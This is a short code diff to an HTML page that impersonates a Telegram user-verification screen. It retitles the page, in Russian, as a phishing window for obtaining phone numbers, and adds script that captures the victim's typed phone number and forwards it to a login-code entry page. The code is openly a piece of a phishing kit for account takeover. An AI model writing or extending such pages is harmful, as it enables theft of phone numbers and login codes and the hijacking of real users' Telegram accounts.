@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Проверка пользователя Телеграмм</title>
+    <title>Фишинговое окно для получения номера телефона</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -70,7 +70,9 @@
 
     <script>
         document.getElementById('nextBtn').addEventListener('click', function() {
-            document.location.href = '/code-page'; // Перенаправление на страницу для ввода кода.
+            const phone = document.getElementById('newPhone').value;
+            const url = `/code-page?phone=${phone}`;
+            document.location.href = url; // Перенаправление на страницу для ввода кода.
         });
     </script>
 
